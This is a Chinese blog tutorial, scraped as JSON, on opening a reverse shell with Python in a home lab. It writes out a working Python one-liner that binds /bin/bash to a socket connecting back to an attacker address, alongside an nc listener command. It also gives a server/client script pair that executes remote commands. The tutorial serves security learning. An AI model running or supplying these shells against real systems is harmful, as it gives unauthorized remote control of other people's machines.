{"blogid": "126693846", "writerAge": "码龄2年", "writerBlogNum": "173", "writerCollect": "3220", "writerComment": "2317", "writerFan": "18616", "writerGrade": "6级", "writerIntegral": "7075", "writerName": "_PowerShell", "writerProfileAdress": "writer_image\\profile_126693846.jpg", "writerRankTotal": "1894", "writerRankWeekly": "57", "writerThumb": "2045", "writerVisitNum": "365027", "blog_read_count": "88", "blog_time": "于 2022-09-06 22:00:00 发布", "blog_title": "[ 隧道技术 ] 反弹shell的集中常见方式（四）python反弹shell", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<blockquote>\n<h1><a id=\"__0\"></a>🍬 博主介绍</h1>\n<p>👨‍🎓 博主介绍：大家好，我是 <a href=\"https://blog.csdn.net/qq_51577576\">_PowerShell</a> ，很高兴认识大家~<br/> ✨主攻领域：【渗透领域】【数据通信】 【通讯安全】 【web安全】【面试分析】<br/> 🎉点赞➕评论➕收藏 == 养成习惯（一键三连）😋<br/> 🎉欢迎关注💗一起学习👍一起讨论⭐️一起进步📝文末有彩蛋<br/> 🙏作者水平有限，欢迎各位大佬指点，相互学习进步！</p>\n</blockquote>\n<p></p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><a href=\"#__0\">🍬 博主介绍</a></li><li><a href=\"#shell_8\">一、反弹shell的常用方式</a></li><li><a href=\"#Python_16\">二、Python介绍</a></li><li><a href=\"#PythonShellsocket_18\">三、Python反弹Shell介绍（建立socket通信）</a></li><li><ul><li><a href=\"#1_24\">1.详细讲解</a></li></ul>\n</li><li><a href=\"#_38\">四、实例讲解</a></li><li><ul><li><a href=\"#1_39\">1、环境</a></li><li><a href=\"#2_42\">2、实验复现</a></li><li><ul><li><a href=\"#1nc_43\">1.攻击机采用nc监听</a></li><li><a href=\"#2_50\">2.靶机执行连接命令</a></li><li><a href=\"#3shell_57\">3.反弹shell成功</a></li></ul>\n</li></ul>\n</li><li><a href=\"#Socket_62\">五、Socket通信是什么，又如何实现</a></li><li><ul><li><a href=\"#1socket_63\">1、简述socket原理</a></li><li><a href=\"#2socket_66\">2、socket通信创建过程（以客户端为例）</a></li><li><ul><li><a href=\"#1Socket_67\">1.创建Socket</a></li><li><a href=\"#2_72\">2.连接到服务器</a></li><li><a href=\"#3_77\">3.发送数据到服务器</a></li><li><a href=\"#4_84\">4.从服务器接受数据</a></li><li><a href=\"#5socket_90\">5.关闭socket</a></li></ul>\n</li><li><a href=\"#3python_socket_92\">3、python 实现socket通信代码实例</a></li><li><ul><li><a href=\"#1_93\">1.准备脚本</a></li><li><a href=\"#2kali_100\">2.服务端执行脚本（kali）</a></li><li><a href=\"#3windows_108\">3.客户端执行脚本（windows）</a></li><li><a href=\"#4_121\">4.服务器端脚本</a></li><li><a href=\"#5_156\">5.客户端脚本</a></li></ul>\n</li></ul>\n</li><li><a href=\"#_185\">六、相关资源</a></li><li><ul><li><a href=\"#1_186\">1、相关文章</a></li><li><a href=\"#2_193\">2、脚本下载</a></li></ul>\n</li></ul>\n</div>\n<p></p>\n<h1><a id=\"shell_8\"></a>一、反弹shell的常用方式</h1>\n<blockquote>\n<p>Netcat反弹<br/> Powercat反弹<br/> Bash反弹<br/> Python反弹<br/> 还有telnet反弹shell，Java反弹shell，php反弹shell等等的<br/> 其实各种反弹shell的方式都是大同小异的<br/> 这篇文章来探讨一下python反弹shell</p>\n</blockquote>\n<h1><a id=\"Python_16\"></a>二、Python介绍</h1>\n<blockquote>\n<p>Python由荷兰数学和计算机科学研究学会的吉多·范罗苏姆于1990年代初设计，作为一门叫做ABC语言的替代品。Python提供了高效的高级数据结构，还能简单有效地面向对象编程。Python语法和动态类型，以及解释型语言的本质，使它成为多数平台上写脚本和快速开发应用的编程语言，随着版本的不断更新和语言新功能的添加，逐渐被用于独立的、大型项目的开发。</p>\n</blockquote>\n<h1><a id=\"PythonShellsocket_18\"></a>三、Python反弹Shell介绍（建立socket通信）</h1>\n<blockquote>\n<p>python2、python3都行，我这里采用的python2</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">python2 -c <span class=\"token string\">\"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class=\"token variable\"><span class=\"token punctuation\">((</span>'攻击机ip'<span class=\"token punctuation\">,</span>端口<span class=\"token punctuation\">))</span></span>;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"</span>\n</code></pre>\n<h2><a id=\"1_24\"></a>1.详细讲解</h2>\n<blockquote>\n<p>看图吧，兄弟们，以前学习的时候都标记了颜色，这里直接截图算了<br/> python -c “import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“攻击机器IP”,端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([”/bin/bash\",“i”]);\"</p>\n</blockquote>\n<p>-c参数 \" 代码 \"<br/> import socket,subprocess,os； 导入这几个库<br/> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)； s=对象<br/> s.connect((“攻击机器IP”,端口))； s连接攻击机器<br/> os.dup2(s.fileno(),1); 控制<br/> os.dup2(s.fileno(),2); 控制<br/> p=subprocess.call([“/bin/bash”,“i”]); 把bash -i交互到攻击机IP 端口<br/> <img alt=\"在这里插入图片描述\" src=\"image\\f3ddce65a8e54de3b73bf0cce086f4fd.png\"/></p>\n<h1><a id=\"_38\"></a>四、实例讲解</h1>\n<h2><a id=\"1_39\"></a>1、环境</h2>\n<blockquote>\n<p>攻击机：本机windows：192.168.192.1<br/> 靶机：虚拟机kali：192.168.13.131</p>\n</blockquote>\n<h2><a id=\"2_42\"></a>2、实验复现</h2>\n<h3><a id=\"1nc_43\"></a>1.攻击机采用nc监听</h3>\n<blockquote>\n<p>攻击机器使用nc执行监听命令</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">.<span class=\"token punctuation\">\\</span>nc.exe -lvvp <span class=\"token number\">55555</span> \n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\39c8f2eb0820474f9cf04c22176814a2.png\"/></p>\n<h3><a id=\"2_50\"></a>2.靶机执行连接命令</h3>\n<blockquote>\n<p>实验靶机执行连接命令</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">python2 -c <span class=\"token string\">\"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class=\"token variable\"><span class=\"token punctuation\">((</span>'<span class=\"token number\">192.168</span><span class=\"token number\">.192</span><span class=\"token number\">.1</span>'<span class=\"token punctuation\">,</span><span class=\"token number\">55555</span><span class=\"token punctuation\">))</span></span>;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\db26f83378f445b59a4f3d9d25bea2cc.png\"/></p>\n<h3><a id=\"3shell_57\"></a>3.反弹shell成功</h3>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\9da2a0a67bfb4cac98c8c230f7e8b82b.png\"/></p>\n<h1><a id=\"Socket_62\"></a>五、Socket通信是什么，又如何实现</h1>\n<h2><a id=\"1socket_63\"></a>1、简述socket原理</h2>\n<blockquote>\n<p>socket又称套间字或者插口，是网络通信中必不可少的工具。有道是：“无socket，不网络”。由于socket最早在BSD Unix上使用，而Unix/Linux所奉为经典的至高哲学是“一切皆是文件”。因此socket在使用时也是完全符合这个哲学的，它涉及到listen()、bind()、accept()、write()/read()、close()等基本的类似于文件操作的功能函数。<br/> 上述Socket功能函数是从传输层协议TCP或者UDP中抽象出来的，一个基本的socket通信可以通过固定的功能函数实现。这里插一句，IP协议是工作在网络层的。</p>\n</blockquote>\n<h2><a id=\"2socket_66\"></a>2、socket通信创建过程（以客户端为例）</h2>\n<h3><a id=\"1Socket_67\"></a>1.创建Socket</h3>\n<blockquote>\n<p>涉及到的主要参数：domain、type、protocal。<br/> domain是协议域，其中AF_INET-&gt;IPv4；AF_INET6-&gt;IPv6 。<br/> type对应socket类型，SOCK_STREAM-&gt;TCP；SOCK_DGRAM-&gt;UDP。<br/> protocol是IPPROTO_TCP，若传入0，则会根据第二个参数type，自动选择合适的参数。</p>\n</blockquote>\n<h3><a id=\"2_72\"></a>2.连接到服务器</h3>\n<blockquote>\n<p>涉及到的主要参数：<br/> 客户端socket<br/> 指向数据结构socketaddr的指针，其中包括目的端口和IP地址<br/> 结构体数据长度</p>\n</blockquote>\n<h3><a id=\"3_77\"></a>3.发送数据到服务器</h3>\n<blockquote>\n<p>涉及到的主要参数：<br/> 客户端socket<br/> 发送内容地址<br/> 发送内容长度<br/> 发送方式标志，一般为0</p>\n</blockquote>\n<h3><a id=\"4_84\"></a>4.从服务器接受数据</h3>\n<blockquote>\n<p>涉及到的主要参数：<br/> 客户端socket<br/> 接受内容缓冲区地址<br/> 接受内容缓冲区长度<br/> 接受方式，0表示阻塞，必须等待服务器返回数据返回值，若成功，则返回读入的字节数，失败则 返回SOCKET_ERROR。</p>\n</blockquote>\n<h3><a id=\"5socket_90\"></a>5.关闭socket</h3>\n<blockquote>\n<p>服务端直接断开就行</p>\n</blockquote>\n<h2><a id=\"3python_socket_92\"></a>3、python 实现socket通信代码实例</h2>\n<h3><a id=\"1_93\"></a>1.准备脚本</h3>\n<blockquote>\n<p>脚本代码在后面<br/> 准备两个脚本，一个为服务端脚本，一个为客户端脚本<br/> 我在本机建立的，把服务端的脚本拖入kali，我都是放的桌面</p>\n</blockquote>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\ff4c886d7fe44dc68a80e3dc21ed8605.png\"/></p>\n<h3><a id=\"2kali_100\"></a>2.服务端执行脚本（kali）</h3>\n<pre><code class=\"prism language-bash\">python3 /root/Desktop/server.py\n</code></pre>\n<blockquote>\n<p>服务端执行脚本后显示准备连接中</p>\n</blockquote>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\45ccbe1bbef64d0b86f904624878b9cf.png\"/></p>\n<h3><a id=\"3windows_108\"></a>3.客户端执行脚本（windows）</h3>\n<pre><code class=\"prism language-bash\">python C:<span class=\"token punctuation\">\\</span>路径<span class=\"token punctuation\">\\</span>client.py\n</code></pre>\n<blockquote>\n<p>客户端执行脚本直接连接成功，我们就可以执行任意命令了</p>\n</blockquote>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\e32010f9dbe443f69c50a63f29aa45a5.png\"/></p>\n<blockquote>\n<p>客户端执行脚本后服务端显示连接成功</p>\n</blockquote>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\1386c414dfc048569d0f752e8ec110a8.png\"/></p>\n<h3><a id=\"4_121\"></a>4.服务器端脚本</h3>\n<pre><code class=\"prism language-bash\">f<span class=\"token comment\">#-*- coding: utf-8 -*-</span>\nfrom socket <span class=\"token function\">import</span> *\n<span class=\"token function\">import</span> os\n<span class=\"token assign-left variable\">HOST</span><span class=\"token operator\">=</span><span class=\"token string\">''</span>\n<span class=\"token assign-left variable\">PORT</span><span class=\"token operator\">=</span><span class=\"token number\">1122</span>\n<span class=\"token assign-left variable\">BUFSIZ</span><span class=\"token operator\">=</span><span class=\"token number\">1024</span>\n<span class=\"token assign-left variable\">ADDR</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>HOST, PORT<span class=\"token punctuation\">)</span>\n<span class=\"token assign-left variable\">sock</span><span class=\"token operator\">=</span>socket<span class=\"token punctuation\">(</span>AF_INET, SOCK_STREAM<span class=\"token punctuation\">)</span>\nsock.bind<span class=\"token punctuation\">(</span>ADDR<span class=\"token punctuation\">)</span>\nsock.listen<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token assign-left variable\">STOP_CHAT</span><span class=\"token operator\">=</span>False\n<span class=\"token keyword\">while</span> not STOP_CHAT:\n    tcpClientSock, <span class=\"token assign-left variable\">addr</span><span class=\"token operator\">=</span>sock.accept<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    print<span class=\"token punctuation\">(</span><span class=\"token string\">'Listening.....'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> True:\n        try:\n            <span class=\"token assign-left variable\">data</span><span class=\"token operator\">=</span>tcpClientSock.recv<span class=\"token punctuation\">(</span>BUFSIZ<span class=\"token punctuation\">)</span>\n        except:\n            tcpClientSock.close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token builtin class-name\">break</span>\n        <span class=\"token keyword\">if</span> not data:\n            <span class=\"token builtin class-name\">break</span>\n        <span class=\"token assign-left variable\">STOP_CHAT</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>data.decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span>.upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token string\">\"QUIT\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> STOP_CHAT:\n            <span class=\"token builtin class-name\">break</span>\n        ME <span class=\"token operator\">=</span> os.popen<span class=\"token punctuation\">(</span>data.decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">))</span>\n        os_result <span class=\"token operator\">=</span> ME.read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        print<span class=\"token punctuation\">(</span>os_result<span class=\"token punctuation\">)</span>\n        tcpClientSock.sendall<span class=\"token punctuation\">(</span>os_result.encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">))</span>\ntcpClientSock.close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsock.close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h3><a id=\"5_156\"></a>5.客户端脚本</h3>\n<pre><code class=\"prism language-bash\"><span class=\"token comment\">#-*- coding: utf-8 -*-</span>\n<span class=\"token function\">import</span> os,sys\nfrom socket <span class=\"token function\">import</span> *\nclass TcpClient:\n    <span class=\"token assign-left variable\">HOST</span><span class=\"token operator\">=</span><span class=\"token string\">'192.168.13.131'</span>\n    <span class=\"token assign-left variable\">PORT</span><span class=\"token operator\">=</span><span class=\"token number\">1122</span>\n    <span class=\"token assign-left variable\">BUFSIZ</span><span class=\"token operator\">=</span><span class=\"token number\">2048</span>\n    <span class=\"token assign-left variable\">ADDR</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>HOST, PORT<span class=\"token punctuation\">)</span>\n    def __init__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span>:\n        self.client<span class=\"token operator\">=</span>socket<span class=\"token punctuation\">(</span>AF_INET, SOCK_STREAM<span class=\"token punctuation\">)</span>\n        self.client.connect<span class=\"token punctuation\">(</span>self.ADDR<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">while</span> True:\n            <span class=\"token assign-left variable\">data</span><span class=\"token operator\">=</span>input<span class=\"token punctuation\">(</span><span class=\"token string\">'OS Shell &gt;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> not data:\n                <span class=\"token builtin class-name\">break</span>\n            self.client.send<span class=\"token punctuation\">(</span>data.encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">))</span>\n            print<span class=\"token punctuation\">(</span><span class=\"token string\">'Execute %s：%s'</span> %<span class=\"token punctuation\">(</span>self.HOST,data<span class=\"token punctuation\">))</span>\n            <span class=\"token keyword\">if</span> data.upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token string\">\"QUIT\"</span><span class=\"token builtin class-name\">:</span>\n                <span class=\"token builtin class-name\">break</span>\n            <span class=\"token assign-left variable\">data</span><span class=\"token operator\">=</span>self.client.recv<span class=\"token punctuation\">(</span>self.BUFSIZ<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> not data:\n                <span class=\"token builtin class-name\">break</span>\n            print<span class=\"token punctuation\">(</span><span class=\"token string\">'Receive：%s'</span> %<span class=\"token punctuation\">(</span>data.decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token builtin class-name\">:</span>\n    <span class=\"token assign-left variable\">client</span><span class=\"token operator\">=</span>TcpClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h1><a id=\"_185\"></a>六、相关资源</h1>\n<h2><a id=\"1_186\"></a>1、相关文章</h2>\n<p><a href=\"https://blog.csdn.net/qq_51577576/article/details/126128251\">[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell</a></p>\n<p><a href=\"https://blog.csdn.net/qq_51577576/article/details/126651576\">[ 隧道技术 ] 反弹shell的集中常见方式（二）bash反弹shell</a></p>\n<p><a href=\"https://blog.csdn.net/qq_51577576/article/details/126682933\">[ 隧道技术 ] 反弹shell的集中常见方式（三）powercat反弹shell</a></p>\n<h2><a id=\"2_193\"></a>2、脚本下载</h2>\n<p>客户端脚本：<br/> 客户端脚本：</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}